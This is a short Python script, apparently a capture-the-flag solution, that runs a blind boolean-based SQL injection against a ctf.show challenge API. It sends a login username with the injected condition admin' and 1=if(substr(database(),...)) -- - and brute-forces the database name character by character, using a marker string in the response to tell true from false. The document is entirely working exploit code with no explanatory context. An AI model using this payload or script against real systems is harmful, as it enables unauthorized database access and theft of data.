import requests
url="http://6bb92e96-2949-468a-8622-dc4988565560.challenge.ctf.show/api/"
flagstr="qwertyuiopa0123sdf-gh4567_89jklzxcvbnm}"
payload="admin' and 1=if(substr(database(),{},1)='{}',1,0) -- -"
name=''
for i in range(1,50):
    for string in flagstr:
        data={
            "username":"admin' and 1=if(substr(database(),{},1)='{}',1,0) -- -".format(i,string),
            "password":0
        }
        re=requests.post(url,data=data)
        if "u8bef" in re.text:
            name+=string
            print(name)

